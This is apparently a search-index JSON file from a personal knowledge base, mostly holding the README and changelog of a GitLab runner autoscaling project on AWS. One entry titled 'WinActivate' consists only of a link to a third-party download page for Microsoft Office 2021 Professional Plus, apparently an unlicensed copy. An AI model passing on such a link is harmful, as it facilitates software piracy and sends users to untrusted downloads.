{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to Insanerask KB","text":"<p>\u00a1Bienvenido a nuestra base de conocimiento cargada de energ\u00eda y conocimientos emocionantes! \ud83d\ude80\ud83d\udca1 Aqu\u00ed encontrar\u00e1s un universo de informaci\u00f3n listo para explorar y descubrir. Desde los conceptos m\u00e1s b\u00e1sicos hasta las ideas m\u00e1s innovadoras, \u00a1todo est\u00e1 aqu\u00ed esperando ser descubierto por ti! \ud83d\udcaa\ud83d\udcab \u00a1Prep\u00e1rate para sumergirte en un viaje de aprendizaje emocionante y lleno de inspiraci\u00f3n! \ud83d\udcda\u2728 \u00a1Bienvenido a bordo! \ud83c\udf89\ud83c\udf1f</p>"},{"location":"WinActivate/","title":"WinActivate","text":"<p>https://filecr.com/windows/microsoft-office-2021-professional-plus/?id=486874909000</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/","title":"GitLab HA Scaling Runner Vending Machine for AWS","text":"<p>\u0010High Availability, Elastic Scaling, Spot &amp; Windows</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#table-of-contents","title":"Table of Contents","text":"<p>[[TOC]]</p> <p>See what's Changed Over Time in the CHANGELOG.md</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#vending-machine","title":"Vending Machine?","text":"<p>Vending Machine is a metaphor for self-service - also known by the handles Service Management Automation (SMA), Service Catalog - it enables developers to build their own Infrastructure by picking it from a menu or being super simple to deploy.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#many-strategic-features-built-in-tldr","title":"Many Strategic Features Built In (TL;DR)","text":"<p>The list of built-in features - things you don't have to engineer yourself - has become so long most folks do a TL;DR and so they are now covered in FEATURES.md The feature categories are: Scaled Runner Management Built-In, Runner Cost Management Built-In, Runner Configuration Best Practices, Security, High Availability, Elastic Scaling, Patching and Updates Built-In, AWS Features and Best Practices, Extensibility, Reusability and Troubleshooting, and Supported Combinations of Operating Systems, Runner Executors and Hardware Architectures.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#significant-cost-control","title":"Significant Cost Control","text":"<ul> <li>90% savings - flexible leveraging of spot compute - save up to 90%.</li> <li>76% or more savings - configurable scheduled shutdown and/or startup for runners runners that do not need to run 24x7. For instance, you save 76% when a runner is scheduled for 40 hours a week ((168-40/168)=76%).</li> <li>scheduled spot runners compound the above savings over always running ondemand instances.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#easy-buttons","title":"Easy Buttons","text":"<p>Walkthrough Video of the Easy Button Capability</p> <p>Even if you start with an easy button, you can go back in and do a stack update, you can make your runner more sophisticated after initial deployment.</p> <p>Clicking the icon in the Easy Button column below will launch the specific example in the CloudFormation Console.</p> <p>You will need your GitLab Instance URL and one or more Runner Registration Tokens (semicolon delimited for multiples).  </p> <p>Note: Runner Registration tokens are in the CI/CD settings of every group and every project on a GitLab instance. They are also available the Instance level for self-managed instances.  When you register a runner at the group or instance level, it is available to all projects in the downbound group heirarchy.</p> <p>Note: The region will automatically be us-east-1, change to your desired region before submitting.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#easy-buttons-provided","title":"Easy Buttons Provided","text":"<p>Note: The easy button code in this project is easy to reuse as a pattern to create your own easy button setups for the CloudFormation Console UI or the CLI. Note: that you can deploy as many of these as you wish as many times as you wish to build runner clusters with the appropriate attributes. Note: The easy buttons use default VPC, default subnets and the default VPC security group. Once you've explored using an easy button, you will need to use the full template to specify these elements. See \"Not An Easy Button Person?\" below.</p> Easy Buttons Name Description Amazon Linux 2 Docker HA with Manual Scaling and Optional Scheduling. Non-spot. Desired capacity of 1 enables WARM HA through ASG Respawn.Desired capacity of 2 enables HOT HA since loss of a node does not make the service unavailable. Desired capacity of 3 or more enables HOT HA and manual scaling of runner fleet. No Spot.Default choice for Linux Docker executor. Amazon Linux 2 Docker HA with Manual Scaling and Optional Scheduling. 100% spot. Desired capacity of 1 enables WARM HA through ASG Respawn.Desired capacity of 2 enables HOT HA since loss of a node does not make the service unavailable.Desired capacity of 3 or more enables HOT HA and manual scaling of runner fleet. 100% Spot. Windows 2019 Shell with Manual Scaling and Optional Scheduling. Scaling and Optional Scheduling. Non-spot. Desired capacity of 1 enables WARM HA through ASG Respawn.Desired capacity of 2 enables HOT HA since loss of a node does not make the service unavailable.Desired capacity of 3 or more enables HOT HA and manual scaling of runner fleet. Default choice for Windows Shell executor. Windows 2019 Shell with Manual Scaling and Optional Scheduling. 100% spot. Desired capacity of 1 enables WARM HA through ASG Respawn.Desired capacity of 2 enables HOT HA since loss of a node does not make the service unavailable.Desired capacity of 3 or more enables HOT HA and manual scaling of runner fleet. 100% Spot. ARM64 Amazon Linux 2 Docker HA with Manual Scaling and Optional Scheduling. Non-spot. Desired capacity of 1 enables WARM HA through ASG Respawn.Desired capacity of 2 enables HOT HA since loss of a node does not make the service unavailable. Desired capacity of 3 or more enables HOT HA and manual scaling of runner fleet.No Spot. ARM64 Amazon Linux 2 Docker HA with Manual Scaling and Optional Scheduling. 100% spot. Desired capacity of 1 enables WARM HA through ASG Respawn.Desired capacity of 2 enables HOT HA since loss of a node does not make the service unavailable.Desired capacity of 3 or more enables HOT HA and manual scaling of runner fleet. 100% Spot. More Advanced Options Including AutoScaling Amazon Linux 2 Docker Simple Scaling Ondemand Instances Two docker executors, scaling based on simple CPU metrics, only spotNote: Actual scaling parameters used in this MVP are just to show how to configure scaling - they are untested with Runner workloads - your can help by contributing your tested scaling parameters in an issue. Amazon Linux 2 Docker Simple Scaling Spot Instances Two docker executors, scaling based on simple CPU metrics, only spotNote: Actual scaling parameters used in this MVP are just to show how to configure scaling - they are untested with Runner workloads - your can help by contributing your tested scaling parameters in an issue. Amazon Linux 2 Docker Simple Scaling Spot and Ondemand Instances (Mixed Instances) Two docker executors, scaling based on simple CPU metrix, 50/50 mix of spot and ondemand.Note: Actual scaling parameters used in this MVP are just to show how to configure scaling - they are untested with Runner workloads - your can help by contributing your tested scaling parameters in an issue. Windows 2019 Shell Simple Scaling Ondemand Instances Two docker executors, scaling based on simple CPU metrics, no spot.Note: Actual scaling parameters used in this MVP are just to show how to configure scaling - they are untested with Runner workloads - your can help by contributing your tested scaling parameters in an issue. Windows 2019 Shell Simple Scaling Spot Instances Two docker executors, scaling based on simple CPU metrics, only spot.Note: Actual scaling parameters used in this MVP are just to show how to configure scaling - they are untested with Runner workloads - your can help by contributing your tested scaling parameters in an issue. Windows 2019 Shell Simple Scaling Spot and Ondemand Instances (Mixed Instances) Two docker executors, scaling based on simple CPU metrics, 50/50 mix of spot and ondemand.Note: Actual scaling parameters used in this MVP are just to show how to configure scaling - they are untested with Runner workloads - your can help by contributing your tested scaling parameters in an issue. <p>Not An Easy Button Person? If easy buttons aren't your thing, click here to load the full template in CloudFormation - the help text in the parameters gives a lot of information - but you may also need to consult this documentation:  (Recommended: add the tags Product=GitLab, Function=GitLabRunner)</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#versioning-in-this-repository","title":"Versioning In This Repository","text":"<p>Versions are managed through tags.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#easy-buttons-in-the-cli","title":"Easy Buttons In the CLI","text":"<p>The easy buttons above use a parent CloudFormation Template.  While it simplifies the first launch graphical experience - it also adds a nest stack that is not needed if you are deploying using code.</p> <p>Note that you can override parameter file values on the command line - which is used here to provide the url and runner registration tokens.</p> <ol> <li>Install aws cli and or use the container</li> <li>Setup your local credentials or use them on the command line (or however your security or IT department requires you to use them locally)</li> <li>Clone the repository locally and change to it's directory</li> <li>Examine the subdirectory easy_button/cfns to find the easy button template you want to use (should be ones to correlate to each of the above easy button setups) and select it and substitute the name for <code>easybutton-amazon-linux-2-arm64-docker-manual-scaling-with-schedule-ondemandonly.cf.yml</code> in the below.</li> <li>Before submitting, customize the following command with your values for \"3GITLABRunnerInstanceURL\" and \"3GITLABRunnerRegTokenList\"</li> </ol> <pre><code>aws cloudformation create-stack --stack-name \"mynewrunner\" --template-url https://s3.us-west-2.amazonaws.com/gl-public-templates/cfn/easybutton-amazon-linux-2-arm64-docker-manual-scaling-with-schedule-ondemandonly.cf.yml --capabilities CAPABILITY_NAMED_IAM --parameters ParameterKey=\"3GITLABRunnerInstanceURL\",ParameterValue=\"https://gitlab.com\"  ParameterKey=\"3GITLABRunnerRegTokenList\",ParameterValue=\"your-list-of-comma-seperated-tokens\"\n</code></pre>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#walk-through-videos","title":"Walk Through Videos","text":"<p>This video does not cover everything in this readme - both need to be reviewed to be productive with this code.</p> <ul> <li>Easy Button: Provisioning 100 GitLab Spot Runners on AWS in Less Than 10 Minutes Using Less Than 10 Clicks + Updating 100 Spot Runners in 10 Minutes</li> <li>Full Template GitLab Runner Vending Machine for AWS: HA and/or Autoscaling on AWS with Spot</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#gitlab-runners-on-aws-spot-best-practices","title":"GitLab Runners on AWS Spot Best Practices","text":"<ol> <li> <p>Spot termination rates are lower than many folks assume, you can see them in the AWS Spot Advisor</p> </li> <li> <p>They can be made even lower by paying a little more using the \"capacity-optimized\" allocation strategy - which is available in this automation.</p> </li> <li> <p>This template bubbles the compute type up as a gitlab runner tag.  \"computetype-spot\" or \"computetype-ondemand\" - so on a job-by-job basis pipeline developers can decide whether to run on spot.  Something like mass testing - which is likely resilient to losing nodes anyway - is a perfect use case. Polling a remote system for status for 12+ hours - probably do not want to run that on spot.</p> </li> <li> <p>The below .gitlab-ci.yml code can be used in jobs to have them retry if they are terminated while running on spot (obviously the job must be engineered to tolerate unexpected terminations)</p> </li> </ol> <p><code>#From: https://docs.gitlab.com/ee/ci/yaml/#retrytest:\u00a0 script: rspec\u00a0 retry:\u00a0 \u00a0 max: 2\u00a0 \u00a0 when: runner_system_failureyaml    #From: https://docs.gitlab.com/ee/ci/yaml/#retry    test:      script: rspec      retry:        max: 2        when: runner_system_failure</code></p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#ec2-image-builder-components-for-creating-windows-shell-runner-amis","title":"EC2 Image Builder Components for Creating Windows Shell Runner AMIs","text":"<p>In the directory ec2-image-builder you will find EC2 Image Builder Components for both building and testing a sample .NET Framework 4 CI Runner.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#aws-service-catalog-and-quickstarts","title":"AWS Service Catalog and QuickStarts","text":"<p>The easy button parent cloudformation templates and the underlying full template are compatible with AWS Service Catalog.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#dont-need-scaling-or-just-one-runner-youre-in-the-right-place","title":"Don't Need Scaling Or Just One Runner?  You're In The Right Place","text":"<p>This template still has a lot of benefits when not used for autoscaling, some of them are:</p> <ul> <li>Self-Service Vending (SMA) of Runners by Developers.</li> <li>Runners are built with IaC, rather than hand crafted.</li> <li>Automatic Hot (2 hosts) or Warm (1 host that respawns) High Availability.</li> <li>Automatic availability scheduling (runner is off during off hours).</li> <li>Use of Spot Compute.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#the-runner-part","title":"The Runner Part","text":"<p>Runner Specific or Highlighted Features: - Start / Stop ASG schedule - specify a cron expression for when the cluster scales to 0 for Min and Desired (stop schedule) and when it scales to \"Min=1\" \"Desired= \" (start schedule), after which autoscaling takes over. - Runner information tagged in AWS and instance name and AWS account set as runner name for easy mapping of runners in GitLab to instances in AWS and vice versa. - Runners self-tag as computetype-spot or computetype-ondemand to allow GitLab CI job level routing based on this information. - Runners self-tag with gitlab runner executor type <p>Each runner supported as a bash or powershell script in the \"runner_configs\" directory. The parameter that take these scripts can be point to any available URL. When pointing it to GitLab, be sure to use a full raw URL that is accessible directly from your instance as it spins up in AWS.</p> <p>These are then referenced in the primary Cloud Formation template in the CloudFormation parameter 3INSTConfigurationScript.</p> <p>Note that these runner scripts have the following attributes (when fully completed): * They are pulled dynamically by instances that are scaling - so they cannot use CloudFormation variable substitutions because that is done long before these are pulled and used. * They must overwrite the TerminationMonitor script built into the CF template so that they can properly drain and unregister a runner on a scale-in operation. * They rely on variable pass through from the main cloud formation code * For runners with docker, the user should just provide an AWS prepared Amazon Linux 2 or Windows AMI with docker preinstalled in parameter * They follow the best practice of using AWS ASG lifecycle hooks to give the instance time to be built - but more importantly, to allow it to drain and unregister on scale-in. * They name and tag runners in both AWS and GitLab to ensure easy cross-system identification.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#should-i-bother-using-this-scaled-runner-template-for-docker-machine-since-it-has-scaling-built-in","title":"Should I bother using this scaled runner template for Docker-machine since it has scaling built in?","text":"<p>Yes - because: * By having your entire runner build in an ASG you are making your runner provisioning production-grade because it is IaC (built with code) * When you end up with runner sprawl, the prospect of updating all runners is much less daunting if they are all built with IaC * the dispatcher node should be in a single instance ASG for warm HA (respawn on death). * It benefits from all the other features of this template including maintenance by repulling the latest AMI, latest patches and latest runner version upon a simple CF stack update. * Docker-machine should be able to be completely replaced by a well tuned ASG housing the plain docker executor.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#maintenance-and-updates-built-in","title":"Maintenance And Updates Built-In","text":"<p>The power of going back into a Runner ASG CloudFormation stack and changing stuff is pretty awesome.</p> <p>Things you can do include:</p> <ol> <li>Make one change an update to the latest AMI, give it the latest patches and update to the latest runner.</li> <li>If you break something in step 1, go back in and peg the AMI and/or Runner version.  Or use an older runner version because you want to match the older version of your Self-hosted instance.</li> <li>Add, remove, redo runner registration tokens to the ASG.</li> <li>Change on/off schedules, scaling metrics, instance types, etc.</li> <li>If you picked simplified parameters to get going and now want to do something advanced like enable autoscaling.</li> </ol> <p>Essentially anything that is parameter can be changed and an update will be pushed.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#cross-references-and-helps-for-this-automation","title":"Cross References and Helps for This Automation","text":"<ul> <li>Blog post on savings using spot, arm and scheduling: How to provision 100 AWS Graviton GitLab Spot Runners in 10 Minutes for $2/hour</li> <li>Walkthrough Video of the Easy Button Capability</li> <li>Easy Button: Provisioning 100 GitLab Spot Runners on AWS in Less Than 10 Minutes Using Less Than 10 Clicks + Updating 100 Spot Runners in 10 Minutes</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#troubleshooting-guide-for-all-the-iac-parts","title":"TroubleShooting Guide For All The IaC Parts","text":"<p>IMPORTANT: The number one suspected cause in debugging cloud automation is \"You probably are not being patient enough and waiting long enough to see the desired result.\" (whether waiting for automation to complete or metrics to flow or other things to trigger as designed)</p> <p>Here is the Testing and Troubleshooting Guide</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#prebuilt-runner-configuration-scripts","title":"Prebuilt Runner Configuration Scripts","text":"<p>The follow Runner configuration scripts are provided with the template.</p> <p>Note: The runner configuration script CloudFormation parameter can take an git raw URL on the public internet - so you can also iterate forward on any runner configuration by starting with these and placing it on a public repository somewhere.</p> Runner Executor Readiness Script Name (Last file on full Git RAW URL) Linux Docker on Amazon Linux 2 - Working: Termination Monitor / Unregister- Working: Reporting CPU &amp; Memory in CloudWatch- Working: CPU and Memory Scaling amazon-linux-2-docker.sh Linux Shell on Amazon Linux 2 - Working: Termination Monitor / Unregister- Working: Reporting CPU &amp; Memory in CloudWatch- Working: CPU and Memory Scaling amazon-linux-2-shell.sh Windows Shell on Whatever Windows AMI You Choose - Working: Termination Monitor / Unregister- Working: Reporting CPU &amp; Memory in CloudWatch- Working: CPU Scaling- NOT Working: Memory Scaling windows-shell.ps1 Windows Docker on Whatever ECS Optimized Windows AMI You Choose (Docker preinstalled) - Working: Termination Monitor / Unregister- Working: Reporting CPU &amp; Memory in CloudWatch- Working: CPU Scaling- NOT Working: Memory Scaling windows-docker.ps1 <p>Note: Unregistration upon termination happens only when the ASG initiates the termination.  Manipulate the ASG's \"Desired\" and \"Minimum\" counts to force this type of termination.  Terminating the instance from the EC2 Console will leave an ophaned runner registration in GitLab.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#gitlab-ci-yaml-hello-world","title":"GitLab CI YAML Hello World","text":"<pre><code>linux-docker-helloworld:\n  image: bash\n  script:\n    - |\n      echo \"Hello from the linux bash container\"\n\nlinux-shell-helloworld:\n  tags:\n    - TagA\n    - TagB\n    - computetype-ondemand\n    - glexecutor-shell\n    - linux\n  script:\n    - |\n      echo \"Hello from the linux bash container\"\n\nwindows-shell-helloworld:\n  tags:\n    - TagA\n    - TagB\n    - computetype-ondemand\n    - glexecutor-shell\n    - windows\n  script:\n    - |\n      write-host \"Hello from a Windows Shell runner\"    \n\nwindows-docker-helloworld:\n  image: mcr.microsoft.com/windows/servercore:ltsc2019\n  tags:\n    - TagA\n    - TagB\n    - computetype-ondemand\n    - glexecutor-docker-windows\n    - windows\n  script:\n    - |\n      write-host \"Hello from the windows ltsc2019 container\"\n</code></pre> <p>Successful status from the above:</p> <p></p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/#example-gitlab-runners-display","title":"Example GitLab Runners Display","text":"<p>Shows all four types registered.</p> <p></p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/","title":"Changelog","text":"<p>All notable changes to this project will be documented in this file.</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v149-alpha14-2021-11-23","title":"[v1.4.9-alpha14] - 2021-11-23","text":"<ul> <li>FIXED #49 / !25 VPCInfo get's an error on stack update (THANKS for this Community Code Contribution from @dan-lind !)</li> <li>ADDED: #46 Allow subnets to be specified via 4ASGSpecifySubnets. Also enables control over public versus private subnets when both exist. Auto lookup of AZs for Subnets (THANKS for this Community Code Contribution from @dan-lind !)</li> <li>ADDED: #42 Added s3:DeleteObject permission to S3 cache bucket so that runner cleanup can be done by runners (@DarwinJS)</li> <li>UPDATED:#45  Clearer description for parameter 5SPOTOnDemandPercentageAboveBaseCapacity (THANKS for this Community Feature Suggestion from @dan-lind)</li> <li>UPDATED/REMOVED: Easy button CLI option now directly reuses the CloudFormation templates to eliminate parameter file maintenance. (@DarwinJS)</li> <li>ADDED: !23 new runner configuration script for building any image architecture using docker buildx : amazon-linux-2-shell-docker-buildx.sh (THANKS for this Community Code Contribution from @jeffersonj !)</li> <li>FIXED: #44 Jobs are not beeing picked up concurrently on the same machine (THANKS for this Community Feature Suggestion from @JBert !)</li> <li>UPDATED: #52 <code>pwsh</code> in shell value specified in config.toml for Windows Server 2019 does not work, must use <code>powershell</code> - it is a known behavior that GitLab Runner v14 and later will default to and require a preinstall of PowerShell Core / 7. See the first sentence under this documentation heading. This IaC is being updated to enable transparent backward compatibility to before v14.  If the machine has pwsh preinstalled, it will use the new default. However, if pwsh is not found, the configuration file will be updated to point to Windows PowerShell (<code>shell = \"powershell\"</code>). (THANKS for this Community Feature Suggestion from @JulioPablo !)</li> <li>ADDED: #55 List of compatible AWS Service and Offerings added to Features Documentation (@DarwinJS)</li> <li>FIXED: #54 Bug: UserData script fails if \"needs-restarting -r\" exits with exit code 1 (THANKS for this Community Code Contribution from @matthias-pichler !)</li> <li>ADDED: !31 add block public access and default encryption to s3 bucket (THANKS for this Community Code Contribution from @matthias-pichler !)</li> <li>ADDED: !48 - Set EBS volume size via parameter (THANKS for this Community Code Contribution from @svenmilewski !)</li> <li>ADDED: !32 require IMDSv2 for instance metadata operations (THANKS for this Community Code Contribution from @matthias-pichler !)</li> <li>FIXED: #57 Windows device name mismatch, should be sda1 not xvda (@DarwinJS)</li> </ul> <p>Thanks to the six community contributors to this release! Contributors: - @dan-lind - @matthias-pichler - @JBert - @jeffersonj - @svenmilewski - @JulioPablo - @DarwinJS</p>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v148-alpha13-2021-08-20","title":"[v1.4.8-alpha13] - 2021-08-20","text":"<ul> <li>This is ancillary sample code, so I did not increment the version (I know, I know)</li> <li>Added EC2 Image Builder components for building Windows Shell Runners AMIs - can be found here: ec2-image-builder and information on them can be found in the README.md</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v148-alpha13-2021-09-18","title":"[v1.4.8-alpha13] - 2021-09-18","text":"<ul> <li>All easy buttons and the main cloud formation template maintain internal version pegging via source pointers even when 'main' matches the most recent version.</li> <li>arm64 specific install of SSM agent and AWS CLI 2 (was not completing CF signals)</li> <li>extended ASG resource creation timeout to allow for larger initial ASG creations</li> <li>linux runner install fixes (especially shell runner)</li> <li>duplicate concurrent jobs parameter in both scaling and GitLab runner sections of CF form</li> <li>four instance types required for spot only easy buttons - this is to reduce terminations along with 'capacity-optimized-prioritized'. Selecting instances that all have the same size name will ensure similar costs. Selecting instances that all have the same size name will ensure similar costs.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v147-alpha12-2021-05-14","title":"[v1.4.7-alpha12] - 2021-05-14","text":"<ul> <li>As per AWS Spot team recommendations: 5SPOTSpotAllocationStrategy now defaults to 'capacity-optimized-prioritized' </li> <li>Replaced single ARM64 Easy button with two that mimic the Linux ones where the user can provide the number of instances to obtain Warm HA, Hot HA or scaling.</li> <li>Forced 5ASGSelfMonitorTerminationInterval to lowest value (currently 1) for any easy button containing spot instances rather than rely on default value in the template</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v146-alpha11-2021-04-22","title":"[v1.4.6-alpha11] - 2021-04-22","text":"<ul> <li>Surfaced parameters for better control of large scale updates:   4ASGUpdateMinInstancesInService and 4ASGUpdateMaxBatchSize</li> <li>Upped maximum initially deployable instances to 20 (update your CF stack to push this higher after deployment)</li> <li>In README.md, added documentation section GitLab Runners on AWS Spot Best Practices</li> <li>In README.md, added a link to video: Provisioning 100 GitLab Spot Runners on AWS in Less Than 10 Minutes Using Less Than 10 Clicks + Updating 100 Spot Runners in 10 Minutes</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v145-alpha10-2021-04-19","title":"[v1.4.5-alpha10] - 2021-04-19","text":"<ul> <li>Simplification of number of easy buttons provided.  Consolidated all manual scaling options and scheduling on per-platform and per-spot basis. Users pick 1, 2, or more instances to control Warm HA, Hot HA or Manual Scaled Fleet. Instance count can be tuned via ASG parameter edits after deployment.</li> <li>Add preflight end-to-end connection tests for endpoints needed for successful installation and configuration of the runner. Fail immediately if there is a possible network problem between the runner network context and the GitLab instance network context. Should cover VPC config, VPC gateway configs, security group configs, NACLs, routing tables, firewalls for both the runner network location and the target GitLab Instance network location.</li> <li>Use Windows 2019 instead of 1903.</li> <li>Retry installations for AWS CLI for MSI error 1618 (MSI is processing another package).</li> <li>Reboot behavior changed to support just one reboot while in launching lifecycle hook - to simplify idempotency checks in spin up automation.</li> <li>Fix for Windows spot draining code.</li> <li>Fail immediately if instance configuration script has non-zero exit.</li> <li>Fixed \"known problem: Windows machines are not completing autoscaling.\" noted in release v1.4.1-alpha7.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v143-alpha9-2021-03-22","title":"[v1.4.3-alpha9] - 2021-03-22","text":"<ul> <li>Enable a much better form based experience without oddly named parameters using AWS::CloudFormation::Interface (#23)</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v142-alpha8-2021-03-17","title":"[v1.4.2-alpha8] - 2021-03-17","text":"<ul> <li>Enable specifying VPC with a new parameter (4ASGSpecifyVPC).  Defaults to DefaultVPC and functions identically to last version when VPC is not specified.  ASG configures for all available subnets in the VPC.</li> <li>Enable specifying VPC was implemented using a best practice CloudFormation Custom Resource python lambda function.</li> <li>LowerCase Custom function also adds 5 random alphanumeric characters</li> <li>Default branch is now 'main'</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v142-alpha7-2021-03-09","title":"[v1.4.2-alpha7] - 2021-03-09","text":"<ul> <li>added easy button for linux docker single instance warm HA with scheduling ability</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v141-alpha7-2021-03-06","title":"[v1.4.1-alpha7] - 2021-03-06","text":"<ul> <li>spot terminations no longer attempt to drain jobs - there is no time for that - all jobs running on spot should be mutable (#1)</li> <li>added asg permission autoscaling:UpdateAutoScalingGroup to enable runner and runner jobs to use the aws cli to take scaling actions for the ASG of the runner for predictive or specific scaling (#13)</li> <li>known problem: Windows machines are not completing autoscaling.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v141-alpha6-2021-03-05","title":"[v1.4.1-alpha6] - 2021-03-05","text":"<ul> <li>Easy Button Parent CF Templates for one button click - compatible with QuickStarts and AWS Service Catalog</li> <li>added CF custom resource for lowercase to ensure bucketname is always lowercase</li> <li>Renamed parameters from SPOTInstanceType to ASGInstanceType to avoid confusion for non-spot and mixed instances implementations</li> <li>Renamed 1OSPatchRunDate to 1OSLastManagedUpdate</li> <li>Simplification of README.md by breaking out FEATURES.md</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v140-alpha6-2021-02-02","title":"[v1.4.0-alpha6] - 2021-02-02","text":"<ul> <li>Support for arm64 architecture for Amazon Linux 2</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v140-alpha5-2021-02-02","title":"[v1.4.0-alpha5] - 2021-02-02","text":"<ul> <li>Automatically configures a Shared S3 Cache (#8)</li> <li>Removed option for installing SSM Agent - just always install it. (#10)</li> <li>Removed CodeDeploy option leftover from ASG template.  SSM Agent can perform \"in-place\" updates if they need to be used instead of simply doing a rolling replacement of instances using an CF Stack update. (#9)</li> <li>Enable a list of runner registration tokens for Linx (#2)</li> <li>Add \"NoEcho\" to parameter for runner token</li> <li>Semicolon delimiting of runner token list to prevent CF parameter problems</li> <li>Easy Button Parameter Set Examples (#11)</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v140-alpha4-2021-01-28","title":"[v1.4.0-alpha4] - 2021-01-28","text":"<ul> <li>This is really a first MVP release - will need everyone's help to refine.</li> <li>Rename to GitLab Scaling Runner Vending Machine for AWS</li> <li>removed default parameters for autoscaling scaling because we do not currently have a tested and advised default for general runner deployment</li> <li>updated template parameter names and help text</li> <li>enablement video added to readme</li> <li>first release ready for external testing</li> <li>four runner configs working</li> <li>added memory and other instance metrics via cloudwatch</li> <li>memory utilization scaling for Linux</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#v140-alpha3-2021-01-27","title":"[v1.4.0-alpha3] - 2021-01-27","text":"<ul> <li>first release ready for external testing</li> <li>four runner configs working</li> <li>added memory and other instance metrics via cloudwatch</li> <li>memory utilization scaling for Linux</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#131-2020-05-20","title":"[1.3.1] - 2020-05-20","text":""},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#updated","title":"Updated","text":"<ul> <li>Sync code with Ultimate ASG Kickstart Version 1.3.0 - especially to enable runner and AWS tagging of \"spot\" versus \"ondemand\" runner instances.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#130-2020-04-17","title":"[1.3.0] - 2020-04-17","text":""},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#added-from-ultimate-asg-kickstart-and-lab-kit","title":"Added (from Ultimate ASG Kickstart and Lab Kit)","text":"<ul> <li>Instances tag themselves as spot or on-demand.  Tag is COMPUTETYPE=SPOT or COMPUTETYPE=ONDEMAND</li> <li>Template defaults to 100% spot instances, disable spot by updating parameter 5SPOTOnDemandPercentageAboveBaseCapacity=100</li> <li>Permission an s3 bucket to support CodeDeploy and SSM, provide an existing bucket or have the template create one for you.</li> <li>autocreated bucket name includes CF stack name - so stack name must be all lower case if using the autocreated bucket.</li> <li>Now Demonstrates use of \"Rules:\" for cross parameter valid to prevent using the default linux ami with a windows stack.</li> <li>Rather than the previous version behavior of a) conditional creation of, b) inline policies - a) always creates b) Managed Policies (named per-stack).  This makes it easier to both understand the minimum permissions and attach them to existing roles.</li> <li>Optional keypair for logon through SSH client or Ec2 web SSH</li> <li>Most resource name uniqueness is accomplished via starting with ${AWS::Stackname}</li> <li>Name change to add \"Kickstart\" to indicate this is suitable for both getting started quickly for the first time in ASG and/or spot as well as suitable for starting new projects even if you are familiar with implementing these.</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#120-2020-03-24","title":"[1.2.0] - 2020-03-24","text":""},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#added","title":"Added","text":"<ul> <li>Added the ability to download and execute an extension to Userdata from a embedded (no download), local file (no download), s3://, https:// or http://</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#110-2020-03-23","title":"[1.1.0] - 2020-03-23","text":""},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CHANGELOG/#added_1","title":"Added","text":"<ul> <li>First version, updates described in README.md</li> </ul>"},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CONTRIBUTIONS/","title":"Branch Testing Before Merging to Main","text":""},{"location":"AWS/gitlab-runner-autoscaling-aws-asg/CONTRIBUTIONS/#community-contributions","title":"Community Contributions","text":"<p>For your initial submission, please:</p> <ol> <li>Fork this repository to a public location (so that your contributions can be editted)</li> <li>Create a new branch FROM THE develop branch (this is even more important if there is a release candidate underway as there are many paths in the project that are updated to point to the new version)</li> <li>Create your changes</li> <li>Test your changes from the code you have merged 